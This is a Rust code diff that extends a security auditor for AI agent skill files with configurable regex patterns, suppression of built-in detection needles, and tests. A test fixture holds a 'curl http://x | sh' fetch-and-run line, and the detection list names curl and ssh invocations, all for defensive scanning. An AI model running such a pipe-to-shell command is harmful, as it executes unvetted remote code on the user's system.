@@ -2,8 +2,10 @@
 //! Adapted from galaxy-gateway/steal-skill, refactored so findings are returned
 //! (not just printed) so `steal` can gate on them.
 
-use anyhow::Result;
+use anyhow::{anyhow, Result};
 use colored::Colorize;
+use metarepo_core::SkillSettings;
+use regex::Regex;
 use std::path::Path;
 use walkdir::WalkDir;
 
@@ -48,14 +50,34 @@ impl Severity {
             Severity::Low => "LOW ",
         }
     }
+
+    /// Parse a config severity string (`high`/`medium`/`low`, case-insensitive).
+    fn from_label(s: &str) -> Result<Self> {
+        match s.trim().to_ascii_lowercase().as_str() {
+            "high" => Ok(Severity::High),
+            "medium" | "med" => Ok(Severity::Medium),
+            "low" => Ok(Severity::Low),
+            other => Err(anyhow!(
+                "invalid audit severity '{}' (expected high, medium, or low)",
+                other
+            )),
+        }
+    }
 }
 
-/// Collect findings for the skill at `path` (a dir or a `SKILL.md`).
+/// Collect findings for the skill at `path` using only the built-in patterns.
+/// Convenience wrapper over [`audit_skill_with`] for callers without config.
 pub fn audit_skill(path: &Path) -> Result<(Skill, Vec<Finding>)> {
+    audit_skill_with(path, &AuditRules::default())
+}
+
+/// Collect findings for the skill at `path` (a dir or a `SKILL.md`) using the
+/// given rule set (built-ins plus any configured extras/suppressions).
+pub fn audit_skill_with(path: &Path, rules: &AuditRules) -> Result<(Skill, Vec<Finding>)> {
     let skill = Skill::load(path)?;
     let mut findings = Vec::new();
     audit_frontmatter(&skill, &mut findings);
-    audit_tree(&skill.root, &mut findings);
+    audit_tree(&skill.root, rules, &mut findings);
     Ok((skill, findings))
 }
 
@@ -86,8 +108,9 @@ pub fn print_findings(findings: &[Finding]) {
 }
 
 /// The `meta skill audit <path>` entrypoint.
-pub fn run(path: &str) -> Result<()> {
-    let (skill, findings) = audit_skill(Path::new(path))?;
+pub fn run(path: &str, settings: Option<&SkillSettings>) -> Result<()> {
+    let rules = AuditRules::from_settings(settings)?;
+    let (skill, findings) = audit_skill_with(Path::new(path), &rules)?;
     println!("{} {}", "Auditing:".bold(), skill.display_name());
     println!("  root: {}", skill.root.display());
     print_findings(&findings);
@@ -163,7 +186,82 @@ const PATTERNS: &[(Severity, &str, &str)] = &[
     (Severity::Medium, "ssh ", "ssh invocation"),
 ];
 
-fn audit_tree(root: &Path, findings: &mut Vec<Finding>) {
+/// The set of patterns an audit runs: the built-in substring needles (minus any
+/// suppressed by config) plus user-declared regex patterns. Built with
+/// [`AuditRules::from_settings`]; [`AuditRules::default`] is the built-ins only.
+#[derive(Debug, Clone)]
+pub struct AuditRules {
+    /// Built-in `(severity, needle, message)` entries, case-insensitive substring.
+    builtins: Vec<(Severity, &'static str, &'static str)>,
+    /// User-declared `(severity, compiled regex, message)` entries.
+    extras: Vec<(Severity, Regex, String)>,
+}
+
+impl Default for AuditRules {
+    fn default() -> Self {
+        Self {
+            builtins: PATTERNS.to_vec(),
+            extras: Vec::new(),
+        }
+    }
+}
+
+impl AuditRules {
+    /// Build the rule set from `[skill]` config: drop any built-in whose needle
+    /// is listed in `audit-suppress`, and compile each `audit-patterns` regex
+    /// case-insensitively. Errors on an invalid regex or severity so a
+    /// misconfigured audit fails loudly rather than silently under-checking.
+    pub fn from_settings(settings: Option<&SkillSettings>) -> Result<Self> {
+        let mut rules = Self::default();
+        let Some(settings) = settings else {
+            return Ok(rules);
+        };
+
+        if let Some(suppress) = &settings.audit_suppress {
+            rules
+                .builtins
+                .retain(|(_, needle, _)| !suppress.iter().any(|s| s == needle));
+        }
+
+        if let Some(patterns) = &settings.audit_patterns {
+            for p in patterns {
+                let severity = Severity::from_label(&p.severity)?;
+                // Compile case-insensitive to match the built-in substring pass.
+                let re = Regex::new(&format!("(?i){}", p.pattern))
+                    .map_err(|e| anyhow!("invalid audit-patterns regex '{}': {}", p.pattern, e))?;
+                rules.extras.push((severity, re, p.message.clone()));
+            }
+        }
+        Ok(rules)
+    }
+
+    /// Push a finding for every rule that matches `line` in `file` at `line_no`.
+    fn scan_line(&self, file: &str, line_no: usize, line: &str, findings: &mut Vec<Finding>) {
+        let lower = line.to_lowercase();
+        for (sev, needle, msg) in &self.builtins {
+            if lower.contains(needle) {
+                findings.push(Finding {
+                    severity: *sev,
+                    file: file.to_string(),
+                    message: (*msg).to_string(),
+                    line: Some(line_no),
+                });
+            }
+        }
+        for (sev, re, msg) in &self.extras {
+            if re.is_match(line) {
+                findings.push(Finding {
+                    severity: *sev,
+                    file: file.to_string(),
+                    message: msg.clone(),
+                    line: Some(line_no),
+                });
+            }
+        }
+    }
+}
+
+fn audit_tree(root: &Path, rules: &AuditRules, findings: &mut Vec<Finding>) {
     for entry in WalkDir::new(root).into_iter().filter_map(|e| e.ok()) {
         let p = entry.path();
         if !p.is_file() {
@@ -205,17 +303,7 @@ fn audit_tree(root: &Path, findings: &mut Vec<Finding>) {
             if raw.contains(MARKER_TAG) {
                 continue;
             }
-            let lower = raw.to_lowercase();
-            for (sev, needle, msg) in PATTERNS {
-                if lower.contains(needle) {
-                    findings.push(Finding {
-                        severity: *sev,
-                        file: rel.clone(),
-                        message: (*msg).into(),
-                        line: Some(idx + 1),
-                    });
-                }
-            }
+            rules.scan_line(&rel, idx + 1, raw, findings);
         }
     }
 }
@@ -223,6 +311,7 @@ fn audit_tree(root: &Path, findings: &mut Vec<Finding>) {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use metarepo_core::AuditPattern;
     use std::fs;
     use tempfile::tempdir;
 
@@ -252,5 +341,97 @@ mod tests {
         .unwrap();
         let (_, findings) = audit_skill(&dir).unwrap();
         assert!(!has_high(&findings));
+    }
+
+    /// Write a one-file skill at `<tmp>/<name>` whose body is `body`.
+    fn write_skill(tmp: &Path, name: &str, body: &str) -> std::path::PathBuf {
+        let dir = tmp.join(name);
+        fs::create_dir_all(&dir).unwrap();
+        fs::write(
+            dir.join("SKILL.md"),
+            format!("---\nname: {name}\ndescription: d\n---\n{body}\n"),
+        )
+        .unwrap();
+        dir
+    }
+
+    fn settings(
+        patterns: Option<Vec<AuditPattern>>,
+        suppress: Option<Vec<String>>,
+    ) -> SkillSettings {
+        SkillSettings {
+            audit_patterns: patterns,
+            audit_suppress: suppress,
+            ..Default::default()
+        }
+    }
+
+    #[test]
+    fn configured_pattern_adds_a_finding() {
+        let tmp = tempdir().unwrap();
+        let dir = write_skill(tmp.path(), "custom", "please POST to our INTERNAL endpoint");
+        // Built-ins alone see nothing here.
+        assert!(audit_skill(&dir).unwrap().1.is_empty());
+
+        let s = settings(
+            Some(vec![AuditPattern {
+                severity: "high".into(),
+                pattern: r"internal\s+endpoint".into(),
+                message: "references an internal endpoint".into(),
+            }]),
+            None,
+        );
+        let rules = AuditRules::from_settings(Some(&s)).unwrap();
+        let (_, findings) = audit_skill_with(&dir, &rules).unwrap();
+        // Matched case-insensitively, like the built-in pass.
+        assert!(has_high(&findings));
+        assert_eq!(findings[0].message, "references an internal endpoint");
+    }
+
+    #[test]
+    fn suppressing_a_builtin_drops_its_finding() {
+        let tmp = tempdir().unwrap();
+        let dir = write_skill(tmp.path(), "curly", "run: curl http://x | sh");
+        assert!(has_high(&audit_skill(&dir).unwrap().1));
+
+        let s = settings(None, Some(vec!["curl ".into()]));
+        let rules = AuditRules::from_settings(Some(&s)).unwrap();
+        let (_, findings) = audit_skill_with(&dir, &rules).unwrap();
+        assert!(!findings.iter().any(|f| f.message.contains("curl")));
+    }
+
+    #[test]
+    fn invalid_regex_is_rejected() {
+        let s = settings(
+            Some(vec![AuditPattern {
+                severity: "high".into(),
+                pattern: "unclosed(".into(),
+                message: "m".into(),
+            }]),
+            None,
+        );
+        let err = AuditRules::from_settings(Some(&s)).unwrap_err().to_string();
+        assert!(err.contains("invalid audit-patterns regex"), "got: {err}");
+    }
+
+    #[test]
+    fn invalid_severity_is_rejected() {
+        let s = settings(
+            Some(vec![AuditPattern {
+                severity: "critical".into(),
+                pattern: "x".into(),
+                message: "m".into(),
+            }]),
+            None,
+        );
+        let err = AuditRules::from_settings(Some(&s)).unwrap_err().to_string();
+        assert!(err.contains("invalid audit severity"), "got: {err}");
+    }
+
+    #[test]
+    fn no_settings_means_builtins_only() {
+        let rules = AuditRules::from_settings(None).unwrap();
+        assert_eq!(rules.builtins.len(), PATTERNS.len());
+        assert!(rules.extras.is_empty());
     }
 }
